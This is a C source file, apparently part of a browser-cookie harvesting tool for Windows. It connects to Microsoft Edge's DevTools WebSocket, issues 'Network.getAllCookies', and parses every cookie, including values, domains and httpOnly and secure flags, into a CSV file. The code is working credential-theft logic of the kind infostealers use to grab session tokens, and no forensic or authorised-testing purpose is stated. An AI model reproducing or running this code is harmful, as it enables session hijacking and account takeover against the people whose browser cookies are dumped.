#include "shared/cookies.h"
#include "dlls/edge/edge.h"
#include "dlls/chromium/websocket.h"

#include <windows.h>
#include <winhttp.h>
#include <stdio.h>
#include <stdlib.h>

typedef enum {
    TYPE_STR,
    TYPE_INT,
    TYPE_INT64,
    TYPE_BOOL,
    TYPE_ENUM_SAMESITE,
    TYPE_ENUM_SCHEME
} field_type_t;

typedef struct {
    const char *key;
    void *target;
    field_type_t type;
    bool required;
} field_map_t;

static char *find_object_end(char* start) {
    int braces = 0;
    char* p = start;
    while (*p) {
        if (*p == '{') braces++;
        else if (*p == '}') {
            braces--;
            if (braces == 0) return p;
            if (braces < 0) {
                printf("Braces cant be smaller than 0\n");
                return NULL;
            }
        }
        p++;
    }
    return NULL;
}

static char *extract_json_string(char *obj_start, char *obj_end, const char *key, char **next_search_start) {
    char pattern[64];

    snprintf(pattern, sizeof(pattern), "\"%s\":", key);

    char *start = strstr(obj_start, pattern);
    if (!start || start > obj_end)
        return NULL;

    start += strlen(pattern);

    while (*start == ' ' || *start == '\t')
        start++;

    if (*start == '"') {
        start++;
        char *end = strchr(start, '"');
        if (!end || end > obj_end) return NULL;
        *end = '\0';
        if (next_search_start) *next_search_start = end + 1;
        return start;
    } else {
        char *end = start;
        while (end < obj_end &&
            *end != ',' &&
            *end != '}')
            end++;

        *end = '\0';
        if (next_search_start) *next_search_start = end + 1;
        return start;
    }
}

static char *get_cookie(cookie_t *cookie, char *start_original) {
    field_map_t fields[] = {
        { "name",          &cookie->name, TYPE_STR, true },
        { "value",         &cookie->value, TYPE_STR, true },
        { "domain",        &cookie->domain, TYPE_STR, true },
        { "path",          &cookie->path, TYPE_STR, true },
        { "expires",       &cookie->expires, TYPE_INT64, true },
        { "httpOnly",      &cookie->http_only, TYPE_BOOL, true },
        { "secure",        &cookie->secure, TYPE_BOOL, true },
        { "session",       &cookie->session, TYPE_BOOL, true },
        { "sameSite",      &cookie->same_site, TYPE_ENUM_SAMESITE, false },
        { "priority",      &cookie->browser.edge.priority, TYPE_INT, true },
        { "sameParty",     &cookie->browser.edge.same_party, TYPE_BOOL, false },
        { "sourceScheme",  &cookie->source_scheme, TYPE_ENUM_SCHEME, true },
        { "sourcePort",    &cookie->browser.edge.source_port, TYPE_INT, true },
    };

    const char *object_start = strstr(start_original, "{\"name");
    if (!object_start) {
        return NULL;
    }
    char *cookie_end = find_object_end(object_start);
    if (!cookie_end) {
        return NULL;
    }

    char *cursor = object_start;
    for (size_t i = 0; i < sizeof(fields)/sizeof(fields[0]); i++) {
        char *val = extract_json_string(cursor, cookie_end, fields[i].key, &cursor);
        if (!val && fields[i].required) return NULL;

        if (!val) continue;

        switch(fields[i].type) {
            case TYPE_STR: *(char**)fields[i].target = val; break;
            case TYPE_INT: *(int*)fields[i].target = atoi(val); break;
            case TYPE_INT64: *(int64_t*)fields[i].target = atoll(val); break;
            case TYPE_BOOL: *(bool*)fields[i].target = (strcmp(val,"true")==0); break;
            case TYPE_ENUM_SAMESITE:
                if (strcmp(val,"None")==0) *(cookie_samesite_t*)fields[i].target = COOKIE_SAMESITE_NONE;
                else if (strcmp(val,"Lax")==0) *(cookie_samesite_t*)fields[i].target = COOKIE_SAMESITE_LAX;
                else *(cookie_samesite_t*)fields[i].target = COOKIE_SAMESITE_STRICT;
                break;
            case TYPE_ENUM_SCHEME:
                if (strcmp(val,"http")==0) *(source_scheme_t*)fields[i].target = SCHEME_HTTP;
                else if (strcmp(val,"https")==0) *(source_scheme_t*)fields[i].target = SCHEME_HTTPS;
                else *(source_scheme_t*)fields[i].target = SCHEME_UNSET;
                break;
        }
    }

    return cookie_end + 1;
}

void fetch_cookies(const char *ws_url, const FILE *outfile) {
    if (!ws_url || !outfile) {
        fputs("Invalid args for function fetch_cookies", stderr);
        return;
    }

    if (!init_cookie_csv(outfile)) {
        fputs("Failed to write csv file header\n", stderr);
        return;
    }

    printf("Connecting to WebSocket: %s\n", ws_url);

    HINTERNET ws = connect_websocket_ptr ? connect_websocket_ptr(ws_url) : NULL;
    if (!ws) {
        printf("[ERROR] WebSocket connection failed\n");
        return;
    }

    printf("WebSocket connected\n");

    int msg_id = 1;
    char msg[256];
    sprintf(msg,
        "{\"id\":%d,\"method\":\"Network.getAllCookies\"}",
        msg_id);

    printf("Sending Network.getAllCookies (id=%d)\n", msg_id);
    if (ws_send_ptr) ws_send_ptr(ws, msg);

    printf("Waiting for cookies response...\n");
    
    char remaining_buffer[WEBSOCKET_RECV_MAX*2];
    size_t remaining_buffer_length = 0;
    const char *start;
    const char *tmp;
    char *resp;
    while (1) {
        bool last_frame;
        if (!ws_recv_ptr || !ws_recv_ptr(ws, &resp, &last_frame)) {
            printf("[ERROR] ws_recv failed\n");
            break;
        }
        size_t resp_len = strlen(resp);
        if (remaining_buffer_length + resp_len >= WEBSOCKET_RECV_MAX*2) {
            printf("[ERROR] Buffer overflow\n");
            break;
        }
        
        memcpy(remaining_buffer + remaining_buffer_length, resp, resp_len);
        free(resp);
        remaining_buffer_length += resp_len;
        remaining_buffer[remaining_buffer_length] = '\0';

        start = strchr(remaining_buffer, '{');
        if (!start) {
            printf("Starting { not found\n");
            return;
        }
        while (true) {
            cookie_t cookie = {0};
            cookie.browser_type = BROWSER_EDGE;
            tmp = get_cookie(&cookie, start);
            if (!tmp) {
                break;
            } else {
                start = tmp;
                write_cookie_csv(outfile, &cookie);
            }
        }

        size_t remaining = remaining_buffer + remaining_buffer_length - start;
        memmove(remaining_buffer, start, remaining);
        remaining_buffer_length = remaining;
        remaining_buffer[remaining_buffer_length] = '\0';

        if (last_frame) {
            break;
        }
    }
    printf("Cookies gathered successfully\n");
    printf("Closing WebSocket\n");

    if (close_websocket_ptr) close_websocket_ptr(ws);

    printf("WebSocket closed\n");
}
